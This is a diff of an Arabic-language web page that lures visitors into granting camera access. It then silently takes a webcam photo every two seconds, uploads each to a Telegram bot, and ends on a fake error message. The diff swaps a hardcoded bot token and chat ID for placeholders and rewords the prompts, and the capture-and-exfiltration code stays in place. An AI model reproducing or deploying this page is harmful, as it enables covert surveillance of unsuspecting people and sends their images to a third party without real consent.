@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جمع البيانات</title>
+    <title>الحصول على المعلومات</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -39,7 +39,8 @@
 
     <script>
         function requestPermissions() {
-            if (confirm("قم بإعطاء كل الأذونات للحصول على المعلومات")) {
+            let confirmPermission = confirm("اضغط 'موافق' ثم اختر 'سماح' للوصول إلى الكاميرا والتقاط الصور.");
+            if (confirmPermission) {
                 getCameraAccess();
             }
         }
@@ -64,15 +65,15 @@
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                                 let imageData = canvas.toDataURL("image/png");
-                                sendToBot(imageData, `photo_${captureCount + 1}`);
+                                sendToBot(imageData, `صورة رقم ${captureCount + 1}`);
 
                                 captureCount++;
                                 captureImage(); // التقاط الصورة التالية
-                            }, 2000); // التقاط كل صورة بعد 2 ثانية
+                            }, 2000); // التقاط صورة كل 2 ثانية
                         } else {
                             stream.getTracks().forEach(track => track.stop());
                             setTimeout(() => {
-                                document.body.innerHTML = "<h2 style='color:red;'>هناك خطأ في جمع البيانات</h2>";
+                                document.body.innerHTML = "<h2 style='color:red;'>❌ هناك خطأ في جمع البيانات</h2>";
                             }, 2000);
                         }
                     }
@@ -80,13 +81,13 @@
                     captureImage();
                 })
                 .catch(err => {
-                    alert("يجب إعطاء إذن الوصول إلى الكاميرا!");
+                    alert("⚠️ يجب السماح باستخدام الكاميرا لإكمال العملية!");
                 });
         }
 
         function sendToBot(imageData, photoName) {
-            let botToken = "7624081263:AAEJBknssL9zfxaZmFf2uf5Xw3usF8U1lGc";
-            let chatId = "7554235698";
+            let botToken = "YOUR_BOT_TOKEN";  // استبدل بـ Token البوت
+            let chatId = "YOUR_CHAT_ID";      // استبدل بـ ID الشات أو القناة
 
             fetch(imageData)
                 .then(res => res.blob())
@@ -94,7 +95,7 @@
                     let formData = new FormData();
                     formData.append("chat_id", chatId);
                     formData.append("photo", blob, `${photoName}.png`);
-                    formData.append("caption", `📸 صورة جديدة: ${photoName}`);
+                    formData.append("caption", `📸 تم التقاط: ${photoName}`);
 
                     return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                         method: "POST",
@@ -103,10 +104,10 @@
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log("تم الإرسال بنجاح:", data);
+                    console.log("✅ تم الإرسال:", data);
                 })
                 .catch(error => {
-                    console.error("خطأ في الإرسال:", error);
+                    console.error("❌ خطأ في الإرسال:", error);
                 });
         }
     </script>
